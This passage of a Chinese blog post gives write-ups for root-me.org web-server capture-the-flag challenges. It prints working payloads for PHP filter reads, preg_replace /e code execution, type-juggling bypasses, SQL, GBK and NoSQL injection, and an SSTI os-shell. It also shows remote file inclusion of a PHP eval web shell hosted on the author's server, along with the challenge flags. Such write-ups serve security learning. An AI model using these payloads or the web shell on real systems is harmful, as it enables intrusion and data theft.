+<p>用filter伪协议读contact.inc.php的源码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge01.root-me.org/web-serveur/ch45/index.php?page=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%32%25%36%35%25%36%31%25%36%34%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%34%25%36%31%25%36%33%25%37%34</span><br></pre></td></tr></table></figure></p>
+<p>在源码里发现了conf.inc.php的存在<br>继续读conf.inc.php发现flag</p>
+<h1 id="PHP-Loose-Comparison"><a href="#PHP-Loose-Comparison" class="headerlink" title="PHP - Loose Comparison"></a>PHP - Loose Comparison</h1><p>给了源码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function gen_secured_random() &#123; // cause random is the way</span><br><span class="line">    $a = rand(1337,2600)*42;</span><br><span class="line">    $b = rand(1879,1955)*42;</span><br><span class="line"></span><br><span class="line">    $a &lt; $b ? $a ^= $b ^= $a ^= $b : $a = $b;</span><br><span class="line"></span><br><span class="line">    return $a+$b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function secured_hash_function($plain) &#123; // cause md5 is the best hash ever</span><br><span class="line">    $secured_plain = sanitize_user_input($plain);</span><br><span class="line">    return md5($secured_plain);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function sanitize_user_input($input) &#123; // cause someone told me to never trust user input</span><br><span class="line">    $re = &apos;/[^a-zA-Z0-9]/&apos;;</span><br><span class="line">    $secured_input = preg_replace($re, &quot;&quot;, $input);</span><br><span class="line">    return $secured_input;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&apos;source&apos;])) &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">require_once &quot;secret.php&quot;;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&apos;s&apos;]) &amp;&amp; isset($_POST[&apos;h&apos;])) &#123;</span><br><span class="line">    $s = sanitize_user_input($_POST[&apos;s&apos;]);</span><br><span class="line">    $h = secured_hash_function($_POST[&apos;h&apos;]);</span><br><span class="line">    $r = gen_secured_random();</span><br><span class="line">    if($s != false &amp;&amp; $h != false) &#123;</span><br><span class="line">        if($s.$r == $h) &#123;</span><br><span class="line">            print &quot;Well done! Here is your flag: &quot;.$flag;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            print &quot;Fail...&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        print &quot;&lt;p&gt;Hum ...&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>逻辑很简单,弱比较。<br>搜一下0e开头的md5值<br>post:<br><code>s=0e&amp;h=s155964671a</code></p>
+<h1 id="PHP-preg-replace"><a href="#PHP-preg-replace" class="headerlink" title="PHP preg_replace()"></a>PHP preg_replace()</h1><p>查看目录文件:<br>preg_replace()的/e修饰符执行代码漏洞。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search=/neko/e&amp;replace=print_r(scandir(getcwd()))&amp;content=neko</span><br></pre></td></tr></table></figure></p>
+<p>结果:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; .</span><br><span class="line">    [1] =&gt; ..</span><br><span class="line">    [2] =&gt; ._nginx.http-level.inc</span><br><span class="line">    [3] =&gt; ._nginx.server-level.inc</span><br><span class="line">    [4] =&gt; ._php53-fpm.pool.inc</span><br><span class="line">    [5] =&gt; flag.php</span><br><span class="line">    [6] =&gt; index.php</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p>
+<p>查看flag.php:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search=/neko/e&amp;replace=show_source(&apos;flag.php&apos;)&amp;content=neko</span><br></pre></td></tr></table></figure></p>
+<p>flag:pr3g_r3pl4c3_3_m0d1f13r_styl3</p>
+<h1 id="PHP-type-juggling"><a href="#PHP-type-juggling" class="headerlink" title="PHP type juggling"></a>PHP type juggling</h1><p>给了源码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">// $FLAG, $USER and $PASSWORD_SHA256 in secret file</span><br><span class="line">require(&quot;secret.php&quot;);</span><br><span class="line"></span><br><span class="line">// show my source code</span><br><span class="line">if(isset($_GET[&apos;source&apos;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$return[&apos;status&apos;] = &apos;Authentication failed!&apos;;</span><br><span class="line">if (isset($_POST[&quot;auth&quot;]))  &#123; </span><br><span class="line">    // retrieve JSON data</span><br><span class="line">    $auth = @json_decode($_POST[&apos;auth&apos;], true);</span><br><span class="line">    </span><br><span class="line">    // check login and password (sha256)</span><br><span class="line">    if($auth[&apos;data&apos;][&apos;login&apos;] == $USER &amp;&amp; !strcmp($auth[&apos;data&apos;][&apos;password&apos;], $PASSWORD_SHA256))&#123;</span><br><span class="line">        $return[&apos;status&apos;] = &quot;Access granted! The validation password is: $FLAG&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">print json_encode($return);</span><br></pre></td></tr></table></figure></p>
+<p><code>$auth[&#39;data&#39;][&#39;login&#39;] == $USER</code>可以用0==’a’的php弱比较绕过，strcmp()可以传入数组使其返回NULL</p>
+<p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;data&quot;:&#123;&quot;login&quot;:0,&quot;password&quot;:[&quot;123&quot;,&quot;456&quot;]&#125;&#125;</span><br><span class="line">经url编码后:</span><br><span class="line">%7b%22data%22%3a%7b%22login%22%3a0%2c%22password%22%3a%5b%22123%22%2c%22456%22%5d%7d%7d</span><br></pre></td></tr></table></figure></p>
+<p>url编码转换:<a href="http://tool.chinaz.com/tools/urlencode.aspx" target="_blank" rel="noopener">http://tool.chinaz.com/tools/urlencode.aspx</a></p>
+<h1 id="Remote-File-Inclusion"><a href="#Remote-File-Inclusion" class="headerlink" title="Remote File Inclusion"></a>Remote File Inclusion</h1><p>访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge01.root-me.org/web-serveur/ch13/?lang=test</span><br></pre></td></tr></table></figure></p>
+<p>回显:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: include(test_lang.php):</span><br></pre></td></tr></table></figure></p>
+<p>可以看到加上了_lang.php的后缀。<br>可以用?屏蔽后面的后缀,也可以用<code>%23a</code><br>在vps上放上neko.txt:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">eval($_POST[&apos;neko&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge01.root-me.org/web-serveur/ch13/?lang=http://打码/neko.txt?</span><br></pre></td></tr></table></figure></p>
+<p>相当于访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge01.root-me.org/web-serveur/ch13/?lang=http://打码/neko.txt?_lang.php</span><br></pre></td></tr></table></figure></p>
+<p>这样_lang.php就被当做一个无效的get参数。<br>post:<br><code>neko=print_r(show_source(&#39;index.php&#39;));</code><br>源码中得到flag<br>(这里vps上不能放置neko.php，这样包含的话是在vps上执行代码)</p>
+<p>看了一个方法，真的是6:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge01.root-me.org/web-serveur/ch13/?lang=data://text/plain;base64,PD9waHANCiRob21lcGFnZSA9IGZpbGVfZ2V0X2NvbnRlbnRzKCdpbmRleC5waHAnKTsNCmVjaG8gJGhvbWVwYWdlOw0KPz4=</span><br></pre></td></tr></table></figure></p>
+<p>查看源码就能看到index.php的源码</p>
+<h1 id="Server-side-Template-Injection"><a href="#Server-side-Template-Injection" class="headerlink" title="Server-side Template Injection"></a>Server-side Template Injection</h1><p>服务端模板注入攻击 (SSTI)自动攻击脚本:<a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener">https://github.com/epinna/tplmap</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 tplmap.py -u http://challenge01.root-me.org/web-serveur/ch41/check -d &quot;nickname=john&quot; --os-shell</span><br></pre></td></tr></table></figure>
+<p>getshell:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[+] Run commands on the operating system.</span><br><span class="line">Linux $ ls</span><br><span class="line">pom.xml</span><br><span class="line">SECRET_FLAG.txt</span><br><span class="line">src</span><br><span class="line">target</span><br><span class="line">webapp</span><br><span class="line">Linux $ cat SECRET_FLAG.txt</span><br><span class="line">B3wareOfT3mplat3Inj3ction</span><br><span class="line">Linux $</span><br></pre></td></tr></table></figure></p>
+<h1 id="SQL-injection-authentication"><a href="#SQL-injection-authentication" class="headerlink" title="SQL injection - authentication"></a>SQL injection - authentication</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">login=admin&apos; /* &amp;password=1</span><br><span class="line">login=admin&apos; -- &amp;password=1</span><br><span class="line">login=admin&amp;password=&apos; or (1 and username=&apos;admin&apos;) and &apos;1</span><br></pre></td></tr></table></figure>
+<p>注意– 后有个空格<br>源代码查看password的value.</p>
+<h1 id="SQL-injection-authentication-GBK"><a href="#SQL-injection-authentication-GBK" class="headerlink" title="SQL injection - authentication - GBK"></a>SQL injection - authentication - GBK</h1><p>宽字节注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login=%df%27 or 1-- &amp;password=1</span><br></pre></td></tr></table></figure></p>
+<p>注意– 后有个空格</p>
+<h1 id="SQL-injection-string"><a href="#SQL-injection-string" class="headerlink" title="SQL injection - string"></a>SQL injection - string</h1><p>在搜索界面找到string注入点<br>判断几列:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">recherche=123&apos; group by 1,2,3,4,5,6 -- -</span><br></pre></td></tr></table></figure></p>
+<p>爆表:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">recherche=123&apos; union select 1,name from sqlite_master -- -</span><br></pre></td></tr></table></figure></p>
+<p>爆列(通过查询sql字段):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">recherche=123&apos; union select 1,sql from sqlite_master -- -</span><br></pre></td></tr></table></figure></p>
+<p>爆内容:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">recherche=123&apos; union select username,password from users -- -</span><br></pre></td></tr></table></figure>
+<h1 id="NoSQL-injection-authentication"><a href="#NoSQL-injection-authentication" class="headerlink" title="NoSQL injection - authentication"></a>NoSQL injection - authentication</h1><p>网上找的wp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">First Solution:</span><br><span class="line">http://challenge01.root-me.org/web-serveur/ch38/?login[$regex]=^f.*$&amp;pass[$ne]=1</span><br><span class="line"></span><br><span class="line">Seconde Solution:</span><br><span class="line">http://challenge01.root-me.org/web-serveur/ch38/?login[$regex]=\S&#123;4&#125;&amp;pass[$ne]=1 //login as test</span><br><span class="line">http://challenge01.root-me.org/web-serveur/ch38/?login[$regex]=\S&#123;5&#125;&amp;pass[$ne]=1 //login as admin</span><br><span class="line">http://challenge01.root-me.org/web-serveur/ch38/?login[$regex]=\S&#123;6&#125;&amp;pass[$ne]=1 //login as flag&#123;nosqli_no_secret_4_you&#125;</span><br><span class="line"></span><br><span class="line">Third Solution:</span><br><span class="line">http://challenge01.root-me.org/web-serveur/ch38/?login[$ne]=1&amp;pass[$ne]=1 //reveals admin</span><br><span class="line">http://challenge01.root-me.org/web-serveur/ch38/?login[$regex]=[^admin]$&amp;pass[$ne]=1 //reveals test</span><br><span class="line">http://challenge01.root-me.org/web-serveur/ch38/?login[$regex]=[^admin|test]$&amp;pass[$ne]=1 //reveals flag&#123;nosqli_no_secret_4_you&#125;</span><br></pre></td></tr></table></figure></p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者: n3k0
+            
+            <p>发表日期: <a href="https://kuraraneko.github.io/2018/03/30/root-me-web-server/">March 30th 2018, 1:26:42</a>
+            <p>发出嘶吼: 没有魔夜2玩我要死了</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2018/04/04/root-me-web-client/" title= root-me web-client >
+                    <div class="nextTitle">root-me web-client</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2018/03/15/slove-me-wp/" title= slove me wp >
+                    <div class="prevTitle">slove me wp</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+    <div id="lv-container" data-id="city" data-uid= MTAyMC8zNjQ3Ni8xMzAxMQ==>
+        <script type="text/javascript">
+            (function (d, s) {
+                var j, e = d.getElementsByTagName(s)[0];
+                if (typeof LivereTower === 'function') { return; }
+                j = d.createElement(s);
+                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                j.async = true;
+
+                e.parentNode.insertBefore(j, e);
+            })(document, 'script');
+        </script>
+        <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC版-->
+
+    <!--PC版-->
+
+
+    
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:3412260756@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                  
+                  <img class="profile-qr" src="/intro/wechat.png" />
+                </span>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer qq" title=qq>
+                  
+                  <img class="profile-qr" src="/intro/qq.jpg" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+        el psy congroo
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HTML"><span class="toc-number">1.</span> <span class="toc-text"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP-Open-redirect"><span class="toc-number">2.</span> <span class="toc-text"><a href="#HTTP-Open-redirect" class="headerlink" title="HTTP - Open redirect"></a>HTTP - Open redirect</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Command-injection"><span class="toc-number">3.</span> <span class="toc-text"><a href="#Command-injection" class="headerlink" title="Command injection"></a>Command injection</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Weak-password"><span class="toc-number">4.</span> <span class="toc-text"><a href="#Weak-password" class="headerlink" title="Weak password"></a>Weak password</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#User-agent"><span class="toc-number">5.</span> <span class="toc-text"><a href="#User-agent" class="headerlink" title="User-agent"></a>User-agent</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#back-file"><span class="toc-number">6.</span> <span class="toc-text"><a href="#back-file" class="headerlink" title="back file"></a>back file</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP-directory-indexing"><span class="toc-number">7.</span> <span class="toc-text"><a href="#HTTP-directory-indexing" class="headerlink" title="HTTP directory indexing"></a>HTTP directory indexing</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP-Headers"><span class="toc-number">8.</span> <span class="toc-text"><a href="#HTTP-Headers" class="headerlink" title="HTTP Headers"></a>HTTP Headers</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP-verb-tampering"><span class="toc-number">9.</span> <span class="toc-text"><a href="#HTTP-verb-tampering" class="headerlink" title="HTTP verb tampering"></a>HTTP verb tampering</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Install-files"><span class="toc-number">10.</span> <span class="toc-text"><a href="#Install-files" class="headerlink" title="Install files"></a>Install files</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Improper-redirect"><span class="toc-number">11.</span> <span class="toc-text"><a href="#Improper-redirect" class="headerlink" title="Improper redirect"></a>Improper redirect</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CRLF"><span class="toc-number">12.</span> <span class="toc-text"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#File-upload-double-extensions"><span class="toc-number">13.</span> <span class="toc-text"><a href="#File-upload-double-extensions" class="headerlink" title="File upload - double extensions"></a>File upload - double extensions</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#File-upload-MIME-type"><span class="toc-number">14.</span> <span class="toc-text"><a href="#File-upload-MIME-type" class="headerlink" title="File upload - MIME type"></a>File upload - MIME type</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP-cookies"><span class="toc-number">15.</span> <span class="toc-text"><a href="#HTTP-cookies" class="headerlink" title="HTTP cookies"></a>HTTP cookies</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Directory-traversal"><span class="toc-number">16.</span> <span class="toc-text"><a href="#Directory-traversal" class="headerlink" title="Directory traversal"></a>Directory traversal</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#File-upload-null-byte"><span class="toc-number">17.</span> <span class="toc-text"><a href="#File-upload-null-byte" class="headerlink" title="File upload - null byte"></a>File upload - null byte</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php-assert"><span class="toc-number">18.</span> <span class="toc-text"><a href="#php-assert" class="headerlink" title="php assert()"></a>php assert()</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP-filters"><span class="toc-number">19.</span> <span class="toc-text"><a href="#PHP-filters" class="headerlink" title="PHP filters"></a>PHP filters</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP-register-globals"><span class="toc-number">20.</span> <span class="toc-text"><a href="#PHP-register-globals" class="headerlink" title="PHP register globals"></a>PHP register globals</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Command-injection-Filter-bypass"><span class="toc-number">21.</span> <span class="toc-text"><a href="#Command-injection-Filter-bypass" class="headerlink" title="Command injection - Filter bypass"></a>Command injection - Filter bypass</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Local-File-Inclusion"><span class="toc-number">22.</span> <span class="toc-text"><a href="#Local-File-Inclusion" class="headerlink" title="Local File Inclusion"></a>Local File Inclusion</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Local-File-Inclusion-Double-encoding"><span class="toc-number">23.</span> <span class="toc-text"><a href="#Local-File-Inclusion-Double-encoding" class="headerlink" title="Local File Inclusion - Double encoding"></a>Local File Inclusion - Double encoding</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP-Loose-Comparison"><span class="toc-number">24.</span> <span class="toc-text"><a href="#PHP-Loose-Comparison" class="headerlink" title="PHP - Loose Comparison"></a>PHP - Loose Comparison</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP-preg-replace"><span class="toc-number">25.</span> <span class="toc-text"><a href="#PHP-preg-replace" class="headerlink" title="PHP preg_replace()"></a>PHP preg_replace()</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP-type-juggling"><span class="toc-number">26.</span> <span class="toc-text"><a href="#PHP-type-juggling" class="headerlink" title="PHP type juggling"></a>PHP type juggling</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Remote-File-Inclusion"><span class="toc-number">27.</span> <span class="toc-text"><a href="#Remote-File-Inclusion" class="headerlink" title="Remote File Inclusion"></a>Remote File Inclusion</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Server-side-Template-Injection"><span class="toc-number">28.</span> <span class="toc-text"><a href="#Server-side-Template-Injection" class="headerlink" title="Server-side Template Injection"></a>Server-side Template Injection</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-injection-authentication"><span class="toc-number">29.</span> <span class="toc-text"><a href="#SQL-injection-authentication" class="headerlink" title="SQL injection - authentication"></a>SQL injection - authentication</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-injection-authentication-GBK"><span class="toc-number">30.</span> <span class="toc-text"><a href="#SQL-injection-authentication-GBK" class="headerlink" title="SQL injection - authentication - GBK"></a>SQL injection - authentication - GBK</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-injection-string"><span class="toc-number">31.</span> <span class="toc-text"><a href="#SQL-injection-string" class="headerlink" title="SQL injection - string"></a>SQL injection - string</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NoSQL-injection-authentication"><span class="toc-number">32.</span> <span class="toc-text"><a href="#NoSQL-injection-authentication" class="headerlink" title="NoSQL injection - authentication"></a>NoSQL injection - authentication</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
